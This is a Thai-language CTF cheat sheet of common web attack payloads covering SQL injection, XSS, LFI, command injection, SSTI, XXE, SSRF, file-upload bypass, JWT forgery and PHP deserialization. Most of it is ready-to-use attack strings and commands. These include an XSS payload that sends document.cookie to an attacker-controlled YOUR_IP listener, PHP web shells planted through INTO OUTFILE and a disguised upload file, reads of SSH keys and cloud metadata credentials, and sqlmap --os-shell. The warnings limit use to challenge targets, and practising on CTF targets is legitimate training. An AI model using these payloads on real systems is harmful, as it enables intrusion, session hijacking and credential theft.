# Common Payloads — ชุด payload ที่ใช้บ่อย (คัดจากที่เจอจริงในสนาม)

> ใช้เมื่อ: เจอช่องกรอก/พารามิเตอร์ที่น่าสงสัย แล้วต้องทดสอบ
> **ทดสอบกับเป้าหมายในโจทย์เท่านั้น** — ผิดกฎหมายถ้าใช้กับเว็บคนอื่น

---

## 1) ก่อนยิง payload — เช็ก 3 อย่าง

```bash
# 1) ค่านี้สะท้อนกลับมาในหน้าเว็บไหม (reflection)
curl -s "http://target/?q=TEST123" | grep TEST123

# 2) มี error ออกมาไหม (error-based)
curl -s "http://target/?id=1'"

# 3) response ต่างจากปกติไหม (status/length)
curl -s -o /dev/null -w '%{http_code} %{size_download}\n' "http://target/?id=1"
curl -s -o /dev/null -w '%{http_code} %{size_download}\n' "http://target/?id=1'"
```

---

## 2) SQL Injection

### 2.1 ตรวจหา (ตามลำดับ)

```sql
'                       -- error ไหม
''                      -- ยัง error ไหม (ถ้าหาย = มีช่องโหว่)
' OR '1'='1             -- login bypass
' OR 1=1-- -
' OR 1=1#
" OR "1"="1
') OR ('1'='1
```

### 2.2 Union-based (ต้องรู้จำนวนคอลัมน์ก่อน)

```sql
' ORDER BY 1-- -         -- เพิ่มเลขไปเรื่อย ๆ จน error = รู้จำนวนคอลัมน์
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -
' UNION SELECT 1,2,3-- -
' UNION SELECT 1,@@version,3-- -                       -- MySQL
' UNION SELECT 1,sqlite_version(),3-- -                 -- SQLite
' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables-- -
' UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users-- -
```

### 2.3 Blind / Time-based (เมื่อไม่เห็นผลลัพธ์)

```sql
' AND 1=1-- -            -- หน้าปกติ
' AND 1=2-- -            -- หน้าว่าง = มี blind SQLi
' AND SLEEP(5)-- -       -- MySQL (รอ 5 วิ = ใช่)
'; SELECT pg_sleep(5)-- - -- PostgreSQL
' AND 1=(SELECT 1 FROM users LIMIT 1)-- -
```

### 2.4 อ่านไฟล์ / เขียนไฟล์ (MySQL)

```sql
' UNION SELECT LOAD_FILE('/etc/passwd'),2-- -
' UNION SELECT '<?php system($_GET["c"]); ?>',2 INTO OUTFILE '/var/www/html/s.php'-- -
```

### 2.5 คำสั่ง sqlmap ที่ใช้บ่อย

```bash
sqlmap -u "http://target/?id=1" --batch --dbs
sqlmap -u "http://target/?id=1" --batch -D db -T users --dump
sqlmap -u "http://target/?id=1" --batch --os-shell        # ระวัง! ใช้เมื่อจำเป็น
sqlmap -r request.txt --batch --dbs                        # จากไฟล์ request ของ Burp
```

---

## 3) XSS (Cross-Site Scripting)

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(document.domain)</script>
'><img src=x onerror=alert(1)>
<iframe src="javascript:alert(1)">
<body onload=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
```

**ข้าม filter:**

```html
<ScRiPt>alert(1)</sCrIpT>
<img src=x onerror="&#97;lert(1)">
<svg/onload=alert`1`>
<script>eval(atob('YWxlcnQoMSk='))</script>
```

**โจทย์ที่มี bot ( steal cookie ):**

```html
<script>fetch('http://YOUR_IP:8000/?c='+document.cookie)</script>
<img src=x onerror="fetch('http://YOUR_IP:8000/?c='+document.cookie)">
```

```bash
# ฝั่งเรา: เปิด listener รับ cookie
python3 -m http.server 8000
```

---

## 4) LFI / Path Traversal

```
../../../../etc/passwd
../../../../../../etc/passwd
....//....//....//etc/passwd          # หลบ filter ที่ลบ ../
..%2f..%2f..%2fetc%2fpasswd           # URL encode
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
/etc/passwd%00                        # null byte (PHP < 5.3.4)
```

**PHP wrapper (สำคัญมากในโจทย์ CTF):**

```
php://filter/convert.base64-encode/resource=index.php
php://filter/read=convert.base64-encode/resource=config.php
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+
expect://id
zip://upload.zip%23shell.php
phar://upload.phar/shell.php
```

```bash
# อ่านซอร์สแล้วถอด base64
curl -s "http://target/?page=php://filter/convert.base64-encode/resource=index.php" | base64 -d
```

**ไฟล์ที่ควรลองอ่าน:**

```
/etc/passwd
/etc/hostname
/proc/self/environ
/proc/self/cmdline
/var/www/html/index.php
/var/www/html/config.php
/home/<user>/.ssh/id_rsa
```

---

## 5) Command Injection

```bash
; id
| id
|| id
& id
&& id
`id`
$(id)
%0a id              # newline
127.0.0.1;cat${IFS}/flag.txt
127.0.0.1|cat$IFS/flag.txt
```

**เมื่อถูกกรองช่องว่าง:**

```bash
127.0.0.1;cat${IFS}/flag.txt
127.0.0.1;cat</flag.txt
127.0.0.1;{cat,/flag.txt}
127.0.0.1;$IFS
```

**อ่าน flag เร็ว ๆ:**

```bash
127.0.0.1;cat /flag* 2>/dev/null;ls -la /;env
```

---

## 6) SSTI (Server-Side Template Injection)

```
{{7*7}}          -> 49 = มีช่องโหว่ (Jinja2/Twig)
${7*7}           -> 49 = FreeMarker / JSP EL
<%= 7*7 %>       -> 49 = ERB (Ruby)
#{7*7}           -> 49 = Ruby / Thymeleaf
{{7*'7'}}        -> 7777777 = Jinja2 (ไม่ใช่ Twig)
```

**Jinja2 (Python/Flask) ไล่ต่อ:**

```
{{config}}
{{config.items()}}
{{''.__class__.__mro__}}
{{cycler.__init__.__globals__.os.popen('id').read()}}
{{lipsum.__globals__['os'].popen('cat /flag').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('cat /flag').read()}}
```

---

## 7) XXE (XML External Entity)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<root><name>&xxe;</name></root>
```

แบบ OOB (เมื่อไม่เห็นผลในหน้าเว็บ):

```xml
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://YOUR_IP:8000/evil.dtd"> %xxe; ]>
```

---

## 8) SSRF (Server-Side Request Forgery)

```
http://127.0.0.1/admin
http://localhost/admin
http://127.0.0.1:8080/
http://169.254.169.254/latest/meta-data/           # AWS metadata
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://[::1]/admin
http://0.0.0.0/admin
http://127.1/admin
file:///etc/passwd
gopher://127.0.0.1:6379/_INFO
dict://127.0.0.1:11211/stat
```

---

## 9) File Upload Bypass

```
shell.php
shell.php5
shell.phtml
shell.phar
shell.PHP
shell.php.jpg
shell.jpg.php
shell.php%00.jpg
shell.php.
.htaccess            # สั่งให้ .jpg รันเป็น php
```

`.htaccess` ที่ใช้ได้:

```
AddType application/x-httpd-php .jpg
```

**ตรวจ magic bytes** (ถ้ากรอง header):

```bash
# เติม GIF header หน้าไฟล์ php
printf 'GIF89a;' > shell.php
cat >> shell.php <<'PHP'
<?php system($_GET['c']); ?>
PHP
```

---

## 10) JWT

```bash
# 1) ถอดดู
jwt_tool <token>

# 2) alg=none
python3 - <<'PY'
import base64, json
def b64(d): return base64.urlsafe_b64encode(json.dumps(d).encode()).rstrip(b'=').decode()
print(b64({"alg":"none","typ":"JWT"}) + "." + b64({"role":"admin"}) + ".")
PY

# 3) crack secret แบบ offline
jwt_tool <token> -C -d /usr/share/wordlists/rockyou.txt

# 4) เซ็นใหม่ด้วย secret ที่ crack ได้
jwt_tool <token> -S hs256 -p '<secret>' -I -pc role -pv admin
```

---

## 11) PHP Deserialization

```php
O:4:"User":2:{s:4:"name";s:5:"guest";s:4:"role";s:5:"admin";}
```

- หา class ที่มี `__wakeup()` / `__destruct()` ในซอร์ส
- ปรับค่า property ให้เป็น `admin`
- ส่งผ่าน cookie/param ที่ unserialize

---

## 12) หมายเหตุความปลอดภัย

- payload พวกนี้ใช้กับ **เป้าหมายในโจทย์** เท่านั้น
- `--os-shell`, `INTO OUTFILE`, การลบไฟล์ = ทำให้ระบบเสียหาย ใช้เมื่อโจทย์ต้องการจริง ๆ
- ถ้าโจทย์ให้ VPN/ขอบเขต IP มา ให้อยู่ในขอบเขตนั้นเท่านั้น
- เก็บ payload ที่ได้ผลไว้ในไฟล์ `notes.md` ของคุณ (เอาไว้เขียน writeup)
